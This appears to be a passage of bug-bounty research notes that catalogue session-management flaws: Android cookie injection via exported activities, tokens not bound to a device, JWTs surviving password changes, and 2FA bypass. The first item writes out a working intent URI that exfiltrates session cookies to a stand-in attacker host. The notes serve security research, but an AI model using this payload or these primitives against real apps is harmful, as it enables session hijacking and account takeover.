...
## MDPsec Verified Patterns (real session-management reports)

Real-world primitives from mdpsec.com reports:

1. **Cookie injection via exported activity** — five independent code paths reach the same sink: `CookieManager.setCookie()` on a URL pulled from an intent extra (no domain validation) immediately followed by WebView load → app writes victim's session cookies onto attacker's domain and issues HTTP request carrying them (41). Paths/extras: `open_screen_key=open_web_view`+URL; `open_screen_key=open_baby_registry`+`item_url`; push-handler URL extra; landing-page deep link code+`item_url`; `open_screen_key=open_lists_favorites`+`item_url`. Delivery: `intent://#Intent;scheme=android-app;package=<app>;S.open_screen_key=open_baby_registry;S.item_url=https://attacker.example/lists/steal;end`.
2. **Session tokens not bound to device/IP** — replay from separate machine with fabricated device identifier works on every endpoint; 90-day lifetime (22, 40, 41, 55, 125, 126).
3. **Stateless JWT survives password changes** — refresh token 30 days; JWT stateless → survives password changes; no revocation path (125).
4. **Session-revoke asymmetry** — session-revoke endpoint lets attacker kill victim's sessions while keeping stolen one (55).
5. **Cookie scope analysis** — session cookie scoped to parent domain with cross-site setting → content-origin page makes authenticated requests to data API (39).
6. **Multi-year session cookies not invalidated on credential rotation/logout** — password-reset email injection chain: stolen cookies persist across victim's future password changes (72).
7. **httpOnly cookie readable in DevTools** — browser-tab navigation onto sysadmin origin (same-origin, avoids CORS wall) lets tenant token hit admin API (76).
...
## a13h1 Medium Writeups — Session & 2FA (2 articles)
- **$900 Session Flaw: Deprovisioned Users Retain Access** — Active session remains valid after user deprovisioned
- **$500 Bypassing 2FA for Password Reset** — 2FA bypass via request manipulation during password reset flow
